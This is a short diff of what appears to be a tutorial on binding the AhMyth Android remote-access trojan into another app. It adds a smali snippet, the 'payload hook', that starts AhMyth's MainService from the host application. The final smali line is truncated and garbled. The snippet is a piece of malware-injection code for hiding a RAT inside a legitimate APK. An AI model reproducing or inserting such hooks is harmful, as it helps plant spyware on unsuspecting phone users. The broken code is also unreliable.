@@ -74,7 +74,15 @@ Below you will see two pieces of coding, the 1st piece is the AhMyth payload hoo
 
 BEFORE
 ------
+```
+new-instance v0, Landroid/content/Intent;
 
+const-class v1, Lahmyth/mine/king/ahmyth/MainService;
+
+invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+
+invoke-virtual {p0, v0}, L';
+```
 
 AFTER
-------
+-----
